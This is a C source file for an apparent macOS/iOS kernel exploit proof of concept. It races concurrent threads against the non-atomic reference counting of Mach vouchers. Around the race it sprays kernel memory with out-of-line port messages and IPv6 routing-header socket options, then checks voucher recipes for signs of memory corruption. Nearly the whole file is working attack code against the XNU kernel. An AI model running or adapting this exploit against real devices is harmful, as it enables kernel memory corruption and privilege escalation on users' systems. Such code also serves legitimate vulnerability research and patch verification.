#include <mach/mach.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "IOKitLib.h"

#include "spray.h"
#include "voucher.h"
#include "helper.h"
#include "iosurface.h"

#define EMADE_RACE_THREAD 2
// #define EMADE_RACE_THREAD 4

#define CONTENT_SIZE 224 // kalloc.2048 <- not much noise on macos
#define UNCORRUPTED_RECIPE_SIZE (CONTENT_SIZE + sizeof(mach_voucher_attr_recipe_data_t))
#define USER_DATA_ELEM_HDR_SIZE 32
#define ELEM_SIZE (CONTENT_SIZE + USER_DATA_ELEM_HDR_SIZE)

#define TRIES 100000

#define WAIT 0
#define START 1
#define DONE 2

#define STRATEGY 1
// #define STRATEGY 2

volatile int sync_threads;
volatile mach_port_t voucher;

void * create_thread(void *arg) {
    mach_port_t host;
    mach_voucher_attr_recipe_t store_recipe;

    host = mach_host_self();
    // store_recipe = create_voucher_recipe(CONTENT_SIZE, (uint64_t)arg);
    store_recipe = *(mach_voucher_attr_recipe_t *)arg;

    while (sync_threads == WAIT) {}
    voucher = create_voucher(host, CONTENT_SIZE, store_recipe);

    return NULL;
}

void * release_thread(void *arg) {
    mach_port_t voucher_port;

    voucher_port = *(mach_port_t *)arg;

    while (sync_threads == WAIT) {}
    release_voucher(voucher_port);

    return NULL;
}

void * inc_emade_thread(void *arg) {
    mach_port_t host, previous_voucher;
    int i;
    uint64_t id;

    host = mach_host_self();
    
    id = *(uint64_t *)arg;
    previous_voucher = voucher;
    while (sync_threads == WAIT) {}
    multiple_redeem_voucher(host, CONTENT_SIZE, id, previous_voucher);

    return NULL;
}

void strategy_one() {
    mach_port_t host, thread, voucher_to_release, target_port;
    mach_port_t *spray_ports, *before_ports, *after_ports;
    kern_return_t kr;
    pthread_t create, release;
    pthread_t inc_emade[EMADE_RACE_THREAD];
    int i, j;
    mach_voucher_attr_recipe_t store_recipe;
    mach_msg_return_t ret;
    mach_msg_type_number_t recipe_size, recipe_legit_size;
    void *recipe;
    int *spray_socks;
    uint8_t **rthdr_buf_array;
    size_t rthdr_len;

    host = mach_host_self();

    recipe_size = MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE;
    recipe = calloc(recipe_size, sizeof(uint8_t));

    spray_socks = prepare_socks();
    prepare_spray_buf(&rthdr_buf_array, &rthdr_len, ELEM_SIZE, 0x800);

    prepare_ports(&before_ports, &after_ports, &target_port);
    spray_ports = prepare_spray_ports(target_port); 

    for (j = 0; j < TRIES; j++) {       
        store_recipe = create_voucher_recipe(CONTENT_SIZE, j);

        ool_ports_descriptor_spray_many(before_ports, N_BEFORE_PORTS, OOL_MESSAGES, spray_ports, OOL_PORTS);
        voucher = create_voucher(host, CONTENT_SIZE, store_recipe);
        ool_ports_descriptor_spray_many(after_ports, N_AFTER_PORTS, OOL_MESSAGES, spray_ports, OOL_PORTS);

        if (j % 100 == 0) {
            INFO_LOG("attempt: %d\n", j);
        }

        sync_threads = WAIT;
        // race e_made++ (non-atomic increment)
        for (i = 0; i < EMADE_RACE_THREAD; i++) {
            pthread_create(&inc_emade[i], NULL, inc_emade_thread, (void *)&j);
        }

        sync_threads = START;
        for (i = 0; i < EMADE_RACE_THREAD; i++) {
            pthread_join(inc_emade[i], NULL);
        }
     
        sync_threads = WAIT;
        pthread_create(&create, NULL, create_thread, (void *)&store_recipe);
        voucher_to_release = voucher;
        pthread_create(&release, NULL, release_thread, (void *)&voucher_to_release);
  
        sync_threads = START;
        pthread_join(create, NULL);
        pthread_join(release, NULL);

        rthdr_spray(spray_socks, rthdr_buf_array, rthdr_len);

        recipe_size = MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE;
        kr = mach_voucher_extract_attr_recipe_trap(voucher, MACH_VOUCHER_ATTR_KEY_USER_DATA, recipe, &recipe_size);
        if (kr == KERN_SUCCESS && recipe_size != UNCORRUPTED_RECIPE_SIZE) {
            INFO_LOG("extract recipe: %x", recipe_size);
            hexdump(recipe, recipe_size);
            break;
        }
        else if (kr != KERN_SUCCESS && kr != KERN_NO_SPACE && kr != MACH_SEND_INVALID_DEST) {
            printf("kr: 0x%x\n", kr);
        }

        mach_port_destroy(mach_task_self(), voucher);
        reset_spray_socks(spray_socks);
        ool_ports_descriptor_receive_many(before_ports, N_BEFORE_PORTS, OOL_MESSAGES);
        ool_ports_descriptor_receive_many(after_ports, N_AFTER_PORTS, OOL_MESSAGES);
    }
}

void strategy_two() {
    printf("Not implemented\n");
}

int main(int argc, const char *argv[]) {
    if (STRATEGY == 1) {
        strategy_one();
    } else {
        strategy_two();
    }

    return 0;
}